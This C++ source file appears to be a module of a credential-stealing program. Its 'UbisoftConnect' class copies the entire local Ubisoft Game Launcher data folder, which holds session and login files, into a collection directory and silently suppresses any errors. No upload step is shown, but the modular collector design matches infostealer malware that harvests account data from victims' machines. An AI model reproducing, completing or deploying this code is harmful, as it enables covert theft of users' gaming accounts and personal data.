//
// Created by .1qxz on 08.06.2024.
//

#include "UbisoftConnect.h"

static const fs::path UBISOFT_PATH = Utils::getLocalPath() / "Ubisoft Game Launcher";

void UbisoftConnect::execute(fs::path &root) {
    std::vector<fs::path> paths = UbisoftConnect::ubisoftFiles();

    if(paths.empty())
        return;

    fs::path dst = root / "Ubisoft Connect";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

std::vector<fs::path> UbisoftConnect::ubisoftFiles() {
    std::vector<fs::path> paths;
    try
    {
        for (const auto& entry : fs::directory_iterator(UBISOFT_PATH)) {
            const fs::path& item_path = entry.path();
            paths.push_back(item_path);
        }
    }
    catch (const fs::filesystem_error& ignored) {}

    return paths;
}
